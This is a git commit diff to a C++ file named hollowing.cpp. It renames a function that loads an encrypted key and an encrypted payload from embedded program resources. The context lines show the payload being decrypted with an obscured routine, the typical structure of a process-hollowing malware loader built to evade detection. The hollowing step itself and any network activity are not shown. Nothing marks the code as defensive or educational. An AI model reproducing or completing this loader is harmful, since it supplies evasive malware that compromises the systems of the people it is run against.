f24594ec1b3efdc699b320ad8be69859f779dabd
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 03:32:24 -0500

    Update hollowing.cpp

--- dummyda/hollowing.cpp
+++ dummyda/hollowing.cpp
@@ -6,7 +6,7 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void loadresbabe(const char* renamer, char** data, DWORD* size) {
+void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
     
@@ -27,11 +27,11 @@ int main() {
     
     char* key101k;
     DWORD key101kLen;
-    loadresbabe("dhanushkey1", &key101k, &key101kLen);
+    loadResource_with("dhanushkey1", &key101k, &key101kLen);
 
     char* code199k;
     DWORD code199kLen;
-    loadresbabe("dhanushcode56", &code199k, &code199kLen);
+    loadResource_with("dhanushcode56", &code199k, &code199kLen);
 
     // Decrypt the payload
     Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
